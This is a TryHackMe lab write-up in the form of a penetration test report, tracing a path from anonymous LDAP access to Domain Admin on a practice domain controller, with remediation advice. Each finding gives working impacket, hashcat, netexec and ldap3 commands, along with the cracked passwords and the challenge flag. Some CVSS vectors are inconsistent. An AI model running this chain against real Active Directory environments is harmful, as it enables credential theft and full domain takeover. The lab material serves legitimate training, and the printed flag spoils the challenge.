Operation Endgame — Penetration Test Disclosure Report

TryHackMe Hard · 2026-07-14

Target: 10.65.152.11 Assessment Date: 2026-07-14 Classification: CONFIDENTIAL

1. Executive Summary

A penetration test was conducted against the thm.local Active Directory environment, compromising a Windows Server 2019 Domain Controller. Starting from zero credentials, the assessment achieved full Domain Administrator compromise through a chain of seven distinct weaknesses: anonymous LDAP enumeration, a passwordless guest account, Kerberoastable service accounts, credential reuse, DACL misconfigurations, and plaintext credential storage in a PowerShell script. The complete attack path — guest account → Kerberoast → password spray → DACL abuse → targeted Kerberoast → credential harvesting — led directly to Domain Admin rights and the retrieval of the root flag.

5. Detailed Findings

F-01: Anonymous LDAP Enumeration Exposes All 331 Domain Users

Severity: Medium (CVSSv3: 5.3) Affected Component: LDAP (port 389)

Description: The Domain Controller permits unauthenticated LDAP binds, exposing the complete directory schema including all 331 user accounts, organizational unit structure, group memberships, Kerberoastable SPNs, and AS-REP roastable accounts. No credentials are required to enumerate the entire domain.

Steps to Reproduce:

ldapsearch -x -H ldap://10.65.152.11 -b "dc=thm,dc=local" "(objectclass=*)" sAMAccountName description memberOf

Impact: An attacker gains a complete map of the domain — user accounts, group structure, OU hierarchy, and service principal names — without any authentication. This information enables targeted attacks including Kerberoasting, AS-REP roasting, password spraying, and privilege escalation path discovery.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N — Network-accessible, no complexity, no privileges, no user interaction, confidentiality impact only.

F-02: Guest Account Has No Password — Full SMB Access

Severity: High (CVSSv3: 7.5) Affected Component: SMB (port 445), Kerberos (port 88)

Description: The guest account has an empty password, allowing unauthenticated Kerberos TGT issuance and full authenticated SMB access to the domain. The guest account can query Service Principal Names (SPNs) across all domain users, enabling Kerberoast attacks without any prior credential.

Steps to Reproduce:

# Kerberos TGT with empty password
impacket-getTGT thm.local/guest: -dc-ip 10.65.152.11 -no-pass

# Kerberoast all SPN-bearing accounts
KRB5CCNAME=/tmp/ guest.ccache impacket-GetUserSPNs thm.local/guest -no-pass -dc-ip 10.65.152.11 -request -outputfile /tmp/kerberoast.txt

Impact: The attacker can authenticate to SMB services, enumerate all SPNs in the domain, and extract Kerberoast TGS hashes for any account with an SPN registered — effectively turning a guest account into a full domain reconnaissance and credential extraction platform.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — Network-accessible, no complexity, no privileges, no user interaction, high confidentiality impact.

F-03: Kerberoastable Service Account (CODY_ROY) With Weak Password

Severity: High (CVSSv3: 7.5) Affected Component: Kerberos TGS (SPN: HTTP/server.secure.com)

Description: The account CODY_ROY has a registered Service Principal Name (HTTP/server.secure.com), making it vulnerable to Kerberoasting. The account's password (MKO)mko0) is weak enough to crack offline with hashcat using rockyou.txt within seconds. The account belongs to the Remote Desktop Users group and is in the Tier 2 OU.

Steps to Reproduce:

# Extract TGS hash (from guest account)
impacket-GetUserSPNs thm.local/guest: -no-pass -dc-ip 10.65.152.11 -request -outputfile /tmp/cody_roy_tgs.txt

# Crack offline
hashcat -m 13100 /tmp/cody_roy_tgs.txt /tmp/rockyou.txt -w 4
# Result: MKO)mko0

Impact: A cracked Kerberoast hash grants the attacker a valid domain credential for the compromised account. This credential enables lateral movement, further enumeration, and abuse of any permissions or group memberships assigned to the account.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — Network-accessible, no complexity, no privileges, no user interaction, high confidentiality impact.

F-04: Credential Reuse Between CODY_ROY and ZACHARY_HUNT

Severity: High (CVSSv3: 7.5) Affected Component: Active Directory authentication

Description: The account ZACHARY_HUNT shares the identical password (MKO)mko0) as CODY_ROY, indicating credential reuse. ZACHARY_HUNT possesses GenericWrite permissions on JERRI_LANCASTER, a privilege not present in CODY_ROY's permissions. This credential reuse provides an unintended privilege escalation path.

Steps to Reproduce:

# Verify credential reuse
netexec smb 10.65.152.11 -u ZACHARY_HUNT -p 'MKO)mko0' --shares

# Enumerate ZACHARY_HUNT's DACL rights
netexec ldap 10.65.152.11 -u ZACHARY_HUNT -p 'MKO)mko0' -M daclread -o TARGET=JERRI_LANCASTER ACTION=read

Impact: Credential reuse across accounts with different privilege levels allows an attacker to escalate access by authenticating as the more privileged account. In this case, ZACHARY_HUNT's GenericWrite on JERRI_LANCASTER enables a targeted Kerberoast attack that would not be possible with CODY_ROY's credentials alone.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — Network-accessible, no complexity, no privileges, no user interaction, high confidentiality impact.

F-05: GenericWrite ACL on JERRI_LANCASTER Allows Targeted Kerberoast

Severity: High (CVSSv3: 8.1) Affected Component: Active Directory DACL (JERRI_LANCASTER account object)

Description: The account ZACHARY_HUNT holds GenericWrite permissions on the JERRI_LANCASTER user object. This allows an attacker to modify the target's attributes — specifically, adding a Service Principal Name (SPN) to make the account Kerberoastable. Once the SPN is added, a Kerberoast TGS can be extracted and cracked offline.

Steps to Reproduce:

# 1. Set SPN on JERRI_LANCASTER (via ldap3)
python3 -c "
from ldap3 import Server, Connection, ALL, SUBNET
s = Server('10.65.152.11', port=389, use_ssl=False, get_info=ALL)
c = Connection(s, user='thm.local\\ZACHARY_HUNT', password='MKO)mko0', auto_bind=True)
c.modify('CN=JERRI_LANCASTER,OU=People,DC=thm,DC=local', {'servicePrincipalName': [('ADD', ['HTTP/jerri.thm.local'])]})
print(c.result)
c.unbind()
"

# 2. Kerberoast the modified account
impacket-GetUserSPNs thm.local/ZACHARY_HUNT:'MKO)mko0' -dc-ip 10.65.152.11 -request -outputfile /tmp/jerri_from_impacket.txt

# 3. Crack offline
hashcat -m 13100 /tmp/jerri_from_impacket.txt /tmp/rockyou.txt -w 4
# Result: lovinlife!

Impact: GenericWrite on a user object enables an attacker to make any account Kerberoastable by adding an SPN, then extract and crack the TGS hash offline. This bypasses the requirement that the target account already have an SPN registered, significantly expanding the attack surface.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — Network-accessible, no complexity, no privileges, no user interaction, high confidentiality and integrity impact.

F-06: JERRI_LANCASTER Has Weak Password Cracked via Kerberoast

Severity: High (CVSSv3: 7.5) Affected Component: Kerberos TGS (SPN: HTTP/jerri.thm.local — attacker-added)

Description: Once made Kerberoastable via DACL abuse, JERRI_LANCASTER's TGS hash was cracked offline to reveal the password lovinlife!. This account has read access to C:\Scripts\syncer.ps1, which contains plaintext Domain Administrator credentials.

Steps to Reproduce:

# Crack the TGS hash (from F-05)
hashcat -m 13100 /tmp/jerri_from_impacket.txt /tmp/rockyou.txt -w 4
# Result: lovinlife!

Impact: The cracked credential provides access to the JERRI_LANCASTER account, which has read access to a scripts directory containing additional credentials — directly enabling escalation to Domain Administrator.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — Network-accessible, no complexity, no privileges, no user interaction, high confidentiality impact.

F-07: Domain Admin Credentials Stored in Plaintext (syncer.ps1)

Severity: Critical (CVSSv3: 9.8) Affected Component: C:\Scripts\syncer.ps1 (file share accessible via RDP command execution)

Description: The file C:\Scripts\syncer.ps1 contains the credentials for SANFORD_DAUGHERTY, a Domain Administrator account, in plaintext:

  • Username: SANFORD_DAUGHERTY
  • Password: RESET_ASAP123

These credentials provide full Domain Administrator access to the domain controller, including the ability to access ADMIN$ and C$ shares, execute arbitrary commands, and retrieve the root flag.

Steps to Reproduce:

# Read the file via RDP command execution
echo "Y" | netexec rdp 10.65.152.11 -u JERRI_LANCASTER -p 'lovinlife!' -x 'type C:\Scripts\syncer.ps1' 2>/dev/null | grep -A20 "SANFORD_DAUGHERTY"

# Authenticate as Domain Admin
netexec smb 10.65.152.11 -u SANFORD_DAUGHERTY -p 'RESET_ASAP123' --shares
# Result: Pwn3d! (admin access confirmed)

# Retrieve flag
impacket-smbclient thm.local/SANFORD_DAUGHERTY:'RESET_ASAP123'@10.65.152.11 -c "get 'Users\Administrator\Desktop\flag.txt.txt' /home/kali/Documents/THM/Challenges/operationendgame/flag.txt.txt"
# Flag: THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}

Impact: Plaintext storage of Domain Administrator credentials in a script accessible to lower-privileged users enables complete domain compromise. An attacker with any access to the scripts directory can retrieve these credentials and gain full control over the Active Directory environment.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — Network-accessible, no complexity, no privileges, no user interaction, high confidentiality, integrity, and availability impact.

6. Remediation Recommendations

Finding Recommendation
F-01 Restrict anonymous LDAP binds to only service accounts that require it. Configure the directory to reject unauthenticated queries for sensitive attributes.
F-02 Disable the guest account or assign a complex password. Audit all accounts for empty passwords using `Get-ADUser -Filter * -Properties PasswordLastSet \ Where-Object {$_.PasswordLastSet -eq $null}`.
F-03 Remove unnecessary SPNs from user accounts. Enforce strong, unique passwords (20+ characters) for all accounts with SPNs registered. Implement Group Managed Service Accounts (gMSAs) where possible.
F-04 Enforce unique passwords per account via Group Policy. Implement password filtering to prevent password reuse across accounts. Audit password age and change policies.
F-05 Audit and remediate all DACL permissions using BloodHound or similar tools. Remove unnecessary GenericWrite, GenericAll, WriteDACL, and WriteOwner permissions from non-admin accounts.
F-06 Enforce strong, unique passwords for all domain accounts. Consider implementing fine-grained password policies for Tier 0 and Tier 1 accounts.
F-07 Remove plaintext credentials from all scripts immediately. Migrate to Group Managed Service Accounts (gMSAs) or Windows Credential Manager for automated credential storage. Restrict access to script directories to only authorized service accounts.
